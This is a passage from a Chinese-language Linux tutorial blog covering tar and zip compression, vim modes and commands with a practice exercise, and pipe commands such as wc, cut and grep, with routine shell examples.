<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">ls</span></span><br><span class="line">new.tar.gz  test.tar  test.tar.gz</span><br><span class="line">[root@rocky8:~]# tar -zxvf new.tar.gz</span><br><span class="line">1.c</span><br><span class="line">2.c</span><br><span class="line">3.c</span><br><span class="line">4.c</span><br><span class="line">[root@rocky8:~]# <span class="built_in">ls</span></span><br><span class="line">1.c  2.c  3.c  4.c  new.tar.gz  test.tar  test.tar.gz</span><br></pre></td></tr></table></figure>
<p>解压到指定目录：-C （解压时可以不指定-z选项）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">ls</span></span><br><span class="line">1.c  2.c  3.c  4.c  new.tar.gz  test.tar  test.tar.gz</span><br><span class="line">[root@rocky8:~]# tar -zxvf new.tar.gz -C number/</span><br><span class="line">1.c</span><br><span class="line">2.c</span><br><span class="line">3.c</span><br><span class="line">4.c</span><br><span class="line">[root@rocky8:~]# <span class="built_in">ls</span> number/</span><br><span class="line">1.c  2.c  3.c  4.c</span><br></pre></td></tr></table></figure>
<p>bzip2命令跟gzip用法类似</p>
<p>压缩用法：tar jcvf 压缩包包名 文件…(tar jcvf bk.tar.bz2 *.c)</p>
<p>解压用法：tar jxvf 压缩包包名 (tar jxvf bk.tar.bz2)</p>
<h4 id="文件压缩解压：zip、unzip">文件压缩解压：zip、unzip</h4>
<p>通过zip压缩文件的目标文件不需要指定扩展名，默认扩展名为zip。</p>
<p>压缩文件：zip [-r] 目标文件(没有扩展名) 源文件</p>
<p>解压文件：unzip -d 解压后目录文件 压缩文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">ls</span></span><br><span class="line">1.txt  2.txt  3.txt  4.txt  test.tar</span><br><span class="line">[root@rocky8:~]# zip myzip *.txt</span><br><span class="line">  adding: 1.txt (stored 0%)</span><br><span class="line">  adding: 2.txt (stored 0%)</span><br><span class="line">  adding: 3.txt (stored 0%)</span><br><span class="line">  adding: 4.txt (stored 0%)</span><br><span class="line">[root@rocky8:~]# <span class="built_in">ls</span></span><br><span class="line">1.txt  2.txt  3.txt  4.txt  myzip.zip  test.tar</span><br><span class="line">[root@rocky8:~]# <span class="built_in">rm</span> -f *.txt *.tar</span><br><span class="line">[root@rocky8:~]# <span class="built_in">ls</span></span><br><span class="line">myzip.zip</span><br><span class="line">[root@rocky8:~]# unzip myzip</span><br><span class="line">Archive:  myzip.zip</span><br><span class="line"> extracting: 1.txt                   </span><br><span class="line"> extracting: 2.txt                   </span><br><span class="line"> extracting: 3.txt                   </span><br><span class="line"> extracting: 4.txt                   </span><br><span class="line">[root@rocky8:~]# <span class="built_in">ls</span></span><br><span class="line">1.txt  2.txt  3.txt  4.txt  myzip.zip</span><br></pre></td></tr></table></figure>
<p>本文参考：</p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>基础知识</category>
        <category>Linux</category>
        <category>Linux基础</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>【Linux】Vim使用及文本处理</title>
    <url>/posts/247a4e5f/</url>
    <content><![CDATA[<h2 id="vim的使用">vim的使用</h2>
<h3 id="什么是-vim？">什么是 vim？</h3>
<p>Vim是从 vi 发展出来的一个文本编辑器。代码补完、编译及错误跳转等方便编程的功能特别丰富，在程序员中被广泛使用。vim 的官方网站 (<a href="http://www.vim.org/">http://www.vim.org</a>)</p>
<p>vim 键盘图：</p>
<p><img src="/posts/247a4e5f//11de8c1d4c8385c025ede918e03b6a86.gif" alt="img"></p>
<p>基本上vi可以分为三种状态：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>命令模式（command mode)</p>
</li>
<li class="lvl-2">
<p>插入模式（Insert mode)</p>
</li>
<li class="lvl-2">
<p>底行模式（last line mode)</p>
</li>
</ul>
<span id="more"></span>
<h3 id="vi-vim的三种模式">vi/vim的三种模式</h3>
<p>vi/vim主要分为三种模式，分别是<strong>命令模式（Command mode）</strong>，<strong>输入模式（Insert mode）**和**底线命令模式（Last line mode）</strong>。</p>
<p><img src="/posts/247a4e5f//1cee092565d316d1462ddbf987fbc6e1.png" alt="img"></p>
<p>这三种模式的作用分别是：</p>
<h4 id="输入模式">输入模式</h4>
<p>在命令模式下输入插入命令i、附加命令a 、打开命令o、修改命令c、取代命令r或替换命令s都可以进入文本输入模式。在该模式下，用户输入的任何字符都被Vi当做文件内容保存起来，并将其显示在屏幕上。在文本输入过程中，若想回到命令模式下，按键ESC即可。</p>
<h4 id="命令模式">命令模式</h4>
<p>用户刚刚启动 vi/vim，便进入了命令模式。 任何时候，不管用户处于何种模式，只要按一下ESC键，即可使Vi进入命令模式；</p>
<p>此状态下敲击键盘动作会被Vim识别为命令，输入<code>:</code> 可切换到<strong>底线命令模式</strong>，以在最底一行输入命令。</p>
<p>若想要编辑文本：启动Vim，进入了命令模式，按下i，切换到输入模式。</p>
<h4 id="底行模式">底行模式</h4>
<p>在命令模式下按下:（英文冒号）就进入了底行命令模式。</p>
<p>底线命令模式可以输入单个或多个字符的命令，可用的命令非常多。</p>
<p>在底线命令模式中，基本的命令有（已经省略了冒号）：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>q 退出程序</p>
</li>
<li class="lvl-2">
<p>w 保存文件</p>
</li>
</ul>
<p>按ESC键可随时退出底线命令模式。</p>
<h3 id="vim基础操作">vim基础操作</h3>
<h4 id="进入输入模式-Insert-mode">进入输入模式(Insert mode)</h4>
<p><img src="/posts/247a4e5f//90d3f3acdaa32af011e62e7be564f47c.png" alt="1574384484673"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>i: 插入光标前一个字符</p>
</li>
<li class="lvl-2">
<p>I: 插入行首</p>
</li>
<li class="lvl-2">
<p>a: 插入光标后一个字符</p>
</li>
<li class="lvl-2">
<p>A: 插入行未</p>
</li>
<li class="lvl-2">
<p>o: 向下新开一行,插入行首</p>
</li>
<li class="lvl-2">
<p>O: 向上新开一行,插入行首</p>
</li>
</ul>
<p>在进入输入模式后， vi 画面的左下角处会出现『–INSERT–』的字样</p>
<h4 id="进入替换模式-Replace-mode">进入替换模式(Replace mode)</h4>
<ul class="lvl-0">
<li class="lvl-2">
<p>r : 只会取代光标所在的那一个字符一次</p>
</li>
<li class="lvl-2">
<p>R: 会一直取代光标所在的文字，直到按下ESC为止</p>
</li>
</ul>
<p>在进入输入模式后， vi 画面的左下角处会出现『–REPLACE–』的字样</p>
<h4 id="命令模式常用命令">命令模式常用命令</h4>
<h5 id="移动光标">移动光标</h5>
<table>
<thead>
<tr>
<th>移动光标的方法</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>h 或 向左箭头键(←)</td>
<td>光标向左移动一个字符</td>
</tr>
<tr>
<td>j 或 向下箭头键(↓)</td>
<td>光标向下移动一个字符</td>
</tr>
<tr>
<td>k 或 向上箭头键(↑)</td>
<td>光标向上移动一个字符</td>
</tr>
<tr>
<td>l 或 向右箭头键(→)</td>
<td>光标向右移动一个字符</td>
</tr>
<tr>
<td>向下移动 30 行，可以使用 “30j” 或 “30↓” 的组合按键</td>
<td></td>
</tr>
<tr>
<td>[Ctrl] + [f]</td>
<td>屏幕『向下』移动一页，相当于 [Page Down]按键 (常用)</td>
</tr>
<tr>
<td>[Ctrl] + [b]</td>
<td>屏幕『向上』移动一页，相当于 [Page Up] 按键 (常用)</td>
</tr>
<tr>
<td>[Ctrl] + [d]</td>
<td>屏幕『向下』移动半页</td>
</tr>
<tr>
<td>[Ctrl] + [u]</td>
<td>屏幕『向上』移动半页</td>
</tr>
<tr>
<td>+</td>
<td>光标移动到非空格符的下一行</td>
</tr>
<tr>
<td>-</td>
<td>光标移动到非空格符的上一行</td>
</tr>
<tr>
<td>n</td>
<td>表示空格光标向右移动这一行的 n 个字符。例如 20 则光标会向后面移动 20 个字符距离。</td>
</tr>
<tr>
<td>0 或功能键[Home]</td>
<td>这是数字『 0 』：移动到这一行的最前面字符处 (常用)</td>
</tr>
<tr>
<td>$ 或功能键[End]</td>
<td>移动到这一行的最后面字符处(常用)</td>
</tr>
<tr>
<td>H</td>
<td>光标移动到这个屏幕的最上方那一行的第一个字符</td>
</tr>
<tr>
<td>M</td>
<td>光标移动到这个屏幕的中央那一行的第一个字符</td>
</tr>
<tr>
<td>L</td>
<td>光标移动到这个屏幕的最下方那一行的第一个字符</td>
</tr>
<tr>
<td>G</td>
<td>移动到这个文档的最后一行(常用)</td>
</tr>
<tr>
<td>nG</td>
<td>n 为数字。移动到这个文件的第 n 行。例如 20G 则会移动到这个文件的第 20 行(可配合 :set nu)</td>
</tr>
<tr>
<td>gg</td>
<td>移动到这个文档的第一行，相当于 1G</td>
</tr>
<tr>
<td>n</td>
<td>n 为数字。光标向下移动 n 行(常用)</td>
</tr>
</tbody>
</table>
<h5 id="删除操作">删除操作</h5>
<table>
<thead>
<tr>
<th>删除操作</th>
<th>删除后会添加到剪切板，相当于剪切</th>
</tr>
</thead>
<tbody>
<tr>
<td>x, X</td>
<td>x为向后删除一个字符 (相当于 [del] 按键)， X为向前删除一个字符(相当于 [backspace] )</td>
</tr>
<tr>
<td>nx</td>
<td>n 为数字，连续向后删除 n 个字符。例如10x表示连续删除 10 个字符。</td>
</tr>
<tr>
<td>dd</td>
<td>删除光标所在的一整行(常用)</td>
</tr>
<tr>
<td>ndd</td>
<td>n 为数字。删除光标所在的向下 n 行，例如 20dd 则是删除 20 行</td>
</tr>
<tr>
<td>d1G</td>
<td>删除光标所在行到首行的所有数据</td>
</tr>
<tr>
<td>dG</td>
<td>删除光标所在行到最后一行的所有数据</td>
</tr>
<tr>
<td>d$</td>
<td>删除光标所在位置到该行的最后一个字符</td>
</tr>
<tr>
<td>d0</td>
<td>删除光标所在位置到该行的最前面一个字符</td>
</tr>
</tbody>
</table>
<h5 id="撤销-复原-重复">撤销&amp;复原&amp;重复</h5>
<table>
<thead>
<tr>
<th>撤销&amp;复原</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>u</td>
<td>撤销操作，相对于普通编辑器里面的ctrl+z</td>
</tr>
<tr>
<td>Ctrl+r</td>
<td>恢复操作，相对于普通编辑器里面的ctrl+y</td>
</tr>
<tr>
<td>.</td>
<td>就是小数点！可重复前一个动作</td>
</tr>
</tbody>
</table>
<h5 id="复制-粘贴">复制&amp;粘贴</h5>
<table>
<thead>
<tr>
<th>复制&amp;粘贴</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>yy</td>
<td>复制光标所在行</td>
</tr>
<tr>
<td>nyy</td>
<td>n 为数字。复制光标所在的向下 n 行，例如 20yy 则是复制 20 行</td>
</tr>
<tr>
<td>y1G</td>
<td>复制光标所在行到第一行的所有数据</td>
</tr>
<tr>
<td>yG</td>
<td>复制光标所在行到最后一行的所有数据</td>
</tr>
<tr>
<td>y0</td>
<td>复制光标所在的那个字符到该行行首的所有数据</td>
</tr>
<tr>
<td>y$</td>
<td>复制光标所在的那个字符到该行行尾的所有数据</td>
</tr>
<tr>
<td>p, P</td>
<td>p 为将已复制的数据在光标下一行贴上，P 则为贴在光标上一行！</td>
</tr>
</tbody>
</table>
<h5 id="合成行">合成行</h5>
<ul class="lvl-0">
<li class="lvl-2">
<p>J: 将光标所在行与下一行的数据结合成同一行</p>
</li>
</ul>
<h5 id="搜索">搜索</h5>
<table>
<thead>
<tr>
<th>搜索</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>/word</td>
<td>向光标之下寻找一个名称为 word 的字符串。</td>
</tr>
<tr>
<td>?word</td>
<td>向光标之上寻找一个字符串名称为 word 的字符串。</td>
</tr>
<tr>
<td>n</td>
<td>代表重复前一个搜寻的动作，根据前面输入的/word还是?word向下或向上搜索下一个匹配的字符串。</td>
</tr>
<tr>
<td>N</td>
<td>表示反向搜索，与n的搜索方向相反。</td>
</tr>
</tbody>
</table>
<h5 id="替换">替换</h5>
<table>
<thead>
<tr>
<th>替换</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>:n1,n2s/word1/word2/g</td>
<td>在第 n1 与 n2 行之间寻找word1并替换为word2！比如『:100,200s/vbird/VBIRD/g』表示在100到200行之间将vbird替换为VBIRD</td>
</tr>
<tr>
<td><code>:1,$s/word1/word2/g</code> 或 <code>:%s/word1/word2/g</code></td>
<td>$表示最后一行，%s表示所有行。</td>
</tr>
<tr>
<td><code>:1,$s/word1/word2/gc</code> 或 <code>:%s/word1/word2/gc</code></td>
<td>gc中的c表示取代前显示提示字符给用户确认 (confirm) ！</td>
</tr>
</tbody>
</table>
<h5 id="底行命令模式的常用操作">底行命令模式的常用操作</h5>
<table>
<thead>
<tr>
<th>底行命令模式</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>:w</td>
<td>保存编辑数据</td>
</tr>
<tr>
<td>:w!</td>
<td>若文件属性为『只读』时，强制写入该文件。不过，到底能不能写入， 还是跟你对该文件的文件权限有关啊！</td>
</tr>
<tr>
<td>:q</td>
<td>离开 vi</td>
</tr>
<tr>
<td>:q!</td>
<td>若曾修改过文件，又不想储存，使用 ! 为强制离开不储存文件。</td>
</tr>
<tr>
<td>惊叹号 (!) 在 vi 当中，常常具有『强制』的意思～</td>
<td></td>
</tr>
<tr>
<td>:wq</td>
<td>储存后离开，若为 :wq! 则为强制储存后离开</td>
</tr>
<tr>
<td>ZZ</td>
<td>若文件没有更动，则不储存离开，若文件已经被更动过，则储存后离开！</td>
</tr>
<tr>
<td>:w [filename]</td>
<td>另存为</td>
</tr>
<tr>
<td>:r [filename]</td>
<td>将另一个文件『filename』的数据加到光标所在行后面</td>
</tr>
<tr>
<td>:n1,n2 w [filename]</td>
<td>将 n1 到 n2 行的内容储存成 filename 这个文件。</td>
</tr>
<tr>
<td>:! command</td>
<td>暂时离开 vi 到指令行模式下执行 command 的显示结果！例如 『:! ls /home』即可在 vi 当中察看 /home 底下以 ls 输出的文件信息！</td>
</tr>
<tr>
<td>:set nu</td>
<td>会在每一行的前缀显示该行的行号</td>
</tr>
<tr>
<td>:set nonu</td>
<td>取消行号显示</td>
</tr>
</tbody>
</table>
<p>示例：</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">将当前路径插入到光标的下一行</span><br><span class="line"><span class="symbol">:r!pwd</span></span><br></pre></td></tr></table></figure>
<h4 id="可视模式">可视模式</h4>
<p>v 进入字符可视化模式： 文本选择是以字符为单位的。<br>
V 进入行可视化模式： 文本选择是以行为单位的。<br>
Ctrl+v 进入块可视化模式 ： 选择一个矩形内的文本。</p>
<p>可视模式下可进行如下操作：</p>
<table>
<thead>
<tr>
<th>可视模式操作</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>A</td>
<td>在选定的部分后面插入内容</td>
</tr>
<tr>
<td>I</td>
<td>在选定的部分前面插入内容</td>
</tr>
<tr>
<td>d</td>
<td>删除选定的部分</td>
</tr>
<tr>
<td>c</td>
<td>删除选定的部分并进入插入模式（有批量替换效果）</td>
</tr>
<tr>
<td>r</td>
<td>把选定的部分全部替换为指定的单个字符</td>
</tr>
<tr>
<td><code>&gt;&gt;</code></td>
<td>向右缩进一个单位，更适合行可视化模式</td>
</tr>
<tr>
<td><code>&lt;&lt;</code></td>
<td>向左缩进一个单位，更适合行可视化模式</td>
</tr>
<tr>
<td><code>gu</code></td>
<td>选中区域转为小写</td>
</tr>
<tr>
<td><code>gU</code></td>
<td>选中区域转为大写</td>
</tr>
<tr>
<td><code>g~</code></td>
<td>大小写互调</td>
</tr>
</tbody>
</table>
<p>可视模式下，选中的区域是由两个端点来界定的（一个在左上角，一个在右下角），在默认情况下只可以控制右下角的端点，而使用<code>o</code>按键则可以在左上角和右下角之间切换控制端点。</p>
<h3 id="VIM快速复习">VIM快速复习</h3>
<h4 id="按-冒号即可进入last-line-mode">按:冒号即可进入last line mode</h4>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="symbol">:set</span> nu 列出行号</span><br><span class="line"><span class="symbol">:set</span> nonu	取消行号</span><br><span class="line"><span class="symbol">:</span><span class="comment">#7 跳到文件中的第7行</span></span><br><span class="line">/keyword 查找字符  按n向下</span><br><span class="line"><span class="string">?k</span>eyword 查找字符  按N向下</span><br><span class="line"><span class="symbol">:n1</span>,n2/word1/word2/gc  替换指定范围单词，c表示提示</span><br><span class="line"><span class="symbol">:w</span> 保存文件</span><br><span class="line"><span class="symbol">:w</span> filename 以指定的文件名另存</span><br><span class="line"><span class="symbol">:n1</span>,n2 w [filename]	将 n1 到 n2行另存</span><br><span class="line"><span class="symbol">:r</span> [filename]	读入另一个文件加到光标所在行后面</span><br><span class="line"><span class="symbol">:</span>! ls /home  在vi当中察看ls输出信息！</span><br><span class="line"><span class="symbol">:q</span>离开vi</span><br><span class="line"><span class="symbol">:wq</span> 和 <span class="symbol">:ZZ</span> 和 <span class="symbol">:x</span> 保存并退出vi</span><br><span class="line">!强制执行</span><br><span class="line"><span class="symbol">:%</span> s/^<span class="regexp">/#/g</span> 来在全部内容的行首添加 <span class="comment"># 号注释</span></span><br><span class="line"><span class="symbol">:</span><span class="number">1</span>,<span class="number">10</span> s/^<span class="regexp">/#/g</span> 在<span class="number">1</span>~<span class="number">10</span> 行首添加 <span class="comment"># 号注释  </span></span><br></pre></td></tr></table></figure>
<h4 id="从command-mode进入Insert-mode">从command mode进入Insert mode</h4>
<p>按i在当前位置编辑按a在当前位置的下一个字符编辑按o插入新行，从行首开始编辑按R(Replace mode)：R会一直取代光标所在的文字，直到按下 ESC为止；(常用)</p>
<h4 id="按ESC键退回command-mode">按ESC键退回command mode</h4>
<p>h←j↓k↑l→前面加数字移动指定的行数或字符数<br>
1、翻页bu上下整页，ud上下半页</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">ctrl+<span class="selector-tag">b</span>：上移一页。</span><br><span class="line">ctrl+f：下移一页。</span><br><span class="line">ctrl+u：上移半页。</span><br><span class="line">ctrl+d：下移半页。</span><br></pre></td></tr></table></figure>
<p>2、行定位</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">7gg</span>或<span class="number">7</span>G：定位第<span class="number">7</span>行首字符。(可能只在Vim中有效)</span><br><span class="line"><span class="attribute">G</span>：移动到文章的最后。</span><br><span class="line"><span class="attribute">7H</span>:当前屏幕的第<span class="number">7</span>行行首</span><br><span class="line"><span class="attribute">M</span>：当前屏幕中间行的行首</span><br><span class="line"><span class="attribute">7L</span>:当前屏幕的倒数第<span class="number">7</span>行行首</span><br></pre></td></tr></table></figure>
<p>3、当前行定位</p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line"><span class="variable">$：</span>移动到光标所在行的“行尾”。</span><br><span class="line"><span class="number">0</span>或^：移动到光标所在行的“行首”</span><br><span class="line">w：光标跳到下个单词的开头</span><br><span class="line">e：光标跳到下个单词的字尾</span><br><span class="line">b：光标回到上个单词的开头</span><br></pre></td></tr></table></figure>
<p>4、编辑</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">x：剪切当前字符</span><br><span class="line">7x：剪切从当前位置起7个字符</span><br><span class="line">大写的X，表示从前面一个字符开始往前计算</span><br><span class="line"><span class="built_in">dd</span>：剪切光标所在行。</span><br><span class="line">7dd：从光标所在行开始剪切7行</span><br><span class="line">d7G	删除光标所在到第7行的所有数据</span><br><span class="line">yw：复制当前单词</span><br><span class="line">7yw：复制从当前位置起7个单词</span><br><span class="line">yy：复制当前行</span><br><span class="line">6yy：从当前行起向下复制6行</span><br><span class="line">y7G	复制游标所在列到第7列的所有数据</span><br><span class="line">p：粘贴</span><br><span class="line">u：撤销</span><br><span class="line">ctrl+r：取消撤销</span><br><span class="line">cw：删除当前单词(从光标位置开始计算)，并进入插入模式</span><br><span class="line">c7w：删除7个单词并进入插入模式</span><br></pre></td></tr></table></figure>
<h4 id="多行编辑，vim支持，vi不支持">多行编辑，vim支持，vi不支持</h4>
<p>按ctrl+V进入块模式，上下键选中快，按大写G选择到末尾，上下左右键移动选择位置按大写I进去编辑模式，输入要插入的字符，编辑完成按ESC退出选中要替换的字符后，按c键全部会删除，然后输入要插入的字符，编辑完成按ESC退出选中要替删除的字符后，按delete键，则会全部删除</p>
<p>按shift+V可进入行模式，对指定行操作</p>
<h3 id="vim练习">vim练习</h3>
<p>1、创建目录/tmp/test，将/etc/man.config复制到该目录下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">mkdir</span> -p /tmp/test</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cp</span> /etc/man.config /tmp/test/</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cd</span> /tmp/test/</span></span><br></pre></td></tr></table></figure>
<p>2、用vim编辑man.config文件：</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">vim man.config</span><br></pre></td></tr></table></figure>
<p>3、设置显示行号； 移动到第58行，向右移动40个字符，查看双引号内的是什么目录；</p>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">：<span class="keyword">set</span> nu</span><br><span class="line">58G 或<span class="comment">58gg</span> </span><br><span class="line">40-&gt; 或40空格 目录为：/dir/bin/foo </span><br></pre></td></tr></table></figure>
<p>4、移动到第一行，并向下查找“bzip2”这个字符串，它在第几行；</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">移动到最后一行，并向上查找该字符串；</span><br><span class="line">gg 或1G</span><br><span class="line">/bzip 137行 ?bzip2</span><br></pre></td></tr></table></figure>
<p>5、将50行到100行之间的man更改为MAN，并且 逐个挑选 是否需要修改；</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">若在挑选过程中一直按y，结果会在最后一行出现改变了几个<span class="built_in">man</span>?</span><br><span class="line">:<span class="number">50</span>,<span class="number">100</span>s/<span class="built_in">man</span>/<span class="built_in">MAN</span>/<span class="built_in">gc</span> <span class="number">25</span>次替换</span><br></pre></td></tr></table></figure>
<p>6、修改完后，突然反悔了，要全部复原，有哪些方法？</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">一直按u键	</span><br><span class="line">或者</span><br><span class="line"><span class="symbol">:q!</span>强制不保存退出后，再重新打开该文件</span><br></pre></td></tr></table></figure>
<p>7、复制65到73这9行的内容（含有MANPATH_MAP），并且粘贴到最后一行之后；</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">65gg</span>或<span class="number">65</span>G到该行后，<span class="number">9</span>yy,G 移动到最后一行，p粘贴</span><br></pre></td></tr></table></figure>
<p>8、21行到42行之间开头为#符号的批注数据不要了，如何删除；</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">21G</span>到该行 <span class="number">22</span>dd</span><br></pre></td></tr></table></figure>
<p>9、将这个文件另存为man.test.config的文件</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">:w <span class="keyword">man</span>.<span class="keyword">test</span>.config</span><br></pre></td></tr></table></figure>
<p>10、到第27行，并且删除15个字符，结果出现的第一个字符是什么？</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">27gg</span> 后<span class="number">15</span>x</span><br></pre></td></tr></table></figure>
<p>11、在第一行新增一行，在该行内输入“I am a student ”</p>
<figure class="highlight mathematica"><table><tr><td class="code"><pre><span class="line"><span class="variable">gg</span>到第一行 <span class="built_in">O</span>输入即可 说明：<span class="variable">o</span>是在当前行之后插入一行，<span class="built_in">O</span>是在当前行之前插入一行</span><br></pre></td></tr></table></figure>
<p>12、保存并退出</p>
<figure class="highlight clojure"><table><tr><td class="code"><pre><span class="line"><span class="symbol">:wq</span></span><br></pre></td></tr></table></figure>
<h2 id="正则表达式（待写）">正则表达式（待写）</h2>
<h2 id="Linux管道命令">Linux管道命令</h2>
<p>Linux的管道命令是’|’，通过它可以对数据进行连续处理，其示意图如下：</p>
<p><img src="/posts/247a4e5f//91c28994d6fb98e8c35f2eac36880df2.jpeg" alt="img"></p>
<p>注意：</p>
<p>1）管道命令仅处理标准输出，对于标准错误输出，将忽略</p>
<p>2）管道命令右边命令，必须能够接收标准输入流命令才行，否则传递过程中数据会抛弃。</p>
<p>常用来作为接收数据管道命令有： less,more,head,tail，而ls, cp, mv就不行。</p>
<h4 id="wc-统计字数">wc - 统计字数</h4>
<p>可以计算文件的Byte数、字数、或是列数，若不指定文件名称、或是所给予的文件名为&quot;-&quot;，则wc指令会从标准输入设备读取数据。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">wc</span> [-lwm] [filename]</span><br><span class="line">-l: 统计行数</span><br><span class="line">-w：统计英文单词</span><br><span class="line">-m：统计字符数</span><br><span class="line">python@xxx:~$ <span class="built_in">wc</span> -l /etc/passwd</span><br><span class="line">49 /etc/passwd</span><br><span class="line">python@xxx:~$ <span class="built_in">wc</span> -w /etc/passwd</span><br><span class="line">81 /etc/passwd</span><br><span class="line">python@xxx:~$ <span class="built_in">wc</span> -m /etc/passwd</span><br><span class="line">2696 /etc/passwd</span><br><span class="line">12345678910</span><br></pre></td></tr></table></figure>
<p>在默认的情况下，wc将计算指定文件的行数、字数，以及字节数。使用的命令为：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">wc</span> testfile           <span class="comment"># testfile文件的统计信息  </span></span><br><span class="line">3 92 598 testfile       <span class="comment"># testfile文件的行数为3、单词数92、字节数598 </span></span><br><span class="line">12</span><br></pre></td></tr></table></figure>
<p>其中，3 个数字分别表示testfile文件的行数、单词数，以及该文件的字节数。</p>
<p>如果想同时统计多个文件的信息，例如同时统计testfile、testfile_1、testfile_2，可使用如下命令：</p>
<figure class="highlight tap"><table><tr><td class="code"><pre><span class="line">$ wc testfile testfile_1 testfile_2  <span class="comment">#统计三个文件的信息  </span></span><br><span class="line">3<span class="number"> 92 </span>598 testfile                    <span class="comment">#第一个文件行数为3、单词数92、字节数598  </span></span><br><span class="line">9<span class="number"> 18 </span>78 testfile_1                   <span class="comment">#第二个文件的行数为9、单词数18、字节数78  </span></span><br><span class="line">3<span class="number"> 6 </span>32 testfile_2                    <span class="comment">#第三个文件的行数为3、单词数6、字节数32  </span></span><br><span class="line">15<span class="number"> 116 </span>708 总用量                    <span class="comment">#三个文件总共的行数为15、单词数116、字节数708 </span></span><br><span class="line">12345</span><br></pre></td></tr></table></figure>
<h4 id="cut-列选取命令">cut - 列选取命令</h4>
<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">选项与参数：</span><br><span class="line"><span class="deletion">-d  ：后面接分隔字符。与 -f 一起使用；</span></span><br><span class="line"><span class="deletion">-f  ：依据 -d 的分隔字符将一段信息分割成为数段，用 -f 取出第几段的意思；</span></span><br><span class="line"><span class="deletion">-c  ：以字符 (characters) 的单位取出固定字符区间；</span></span><br><span class="line">1234</span><br></pre></td></tr></table></figure>
<p>cut以行为单位，根据分隔符把行分成若干列，这样就可以指定选取哪些列了。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cut</span> -d <span class="string">&#x27;分隔字符&#x27;</span> -f 选取的列数</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span>|<span class="built_in">cut</span> -d <span class="string">&#x27;:&#x27;</span> -f 2  	--选取第2列</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span>|<span class="built_in">cut</span> -d <span class="string">&#x27;:&#x27;</span> -f 3,5  	--选取第3列和第5列</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span>|<span class="built_in">cut</span> -d <span class="string">&#x27;:&#x27;</span> -f 3-5  	--选取第3列到第5列</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span>|<span class="built_in">cut</span> -d <span class="string">&#x27;:&#x27;</span> -f 3-   	--选取第3列到最后1列</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span>|<span class="built_in">cut</span> -d <span class="string">&#x27;:&#x27;</span> -f 1-3,5	--选取第1到第3列还有第5列</span><br><span class="line">123456</span><br></pre></td></tr></table></figure>
<p>只显示/etc/passwd的用户和shell：</p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="meta">#cat /etc/passwd | cut -d <span class="string">&#x27;:&#x27;</span> -f 1,7 </span></span><br><span class="line"><span class="symbol">root:</span><span class="keyword">/bin/</span>bash</span><br><span class="line"><span class="symbol">daemon:</span><span class="keyword">/bin/</span>sh</span><br><span class="line"><span class="symbol">bin:</span><span class="keyword">/bin/</span>sh</span><br><span class="line"><span class="number">1234</span></span><br></pre></td></tr></table></figure>
<h4 id="grep-行选取命令">grep - 行选取命令</h4>
<p>grep一般格式为：</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"><span class="keyword">grep</span> [-cinv] <span class="string">&#x27;查找的字符串&#x27;</span> filename</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>在grep命令中输入字符串参数时，最好引号或双引号括起来。例如：<code>grep 'a' 1.txt</code>。</p>
<p>常用选项说明：</p>
<table>
<thead>
<tr>
<th>选项</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>-v</td>
<td>显示不包含匹配文本的所有行（相当于求反）</td>
</tr>
<tr>
<td>-n</td>
<td>显示匹配行及行号</td>
</tr>
<tr>
<td>-i</td>
<td>忽略大小写</td>
</tr>
<tr>
<td>-c</td>
<td>计算找到的行数</td>
</tr>
</tbody>
</table>
<p>grep搜索内容串可以是正则表达式，常用正则表达式：</p>
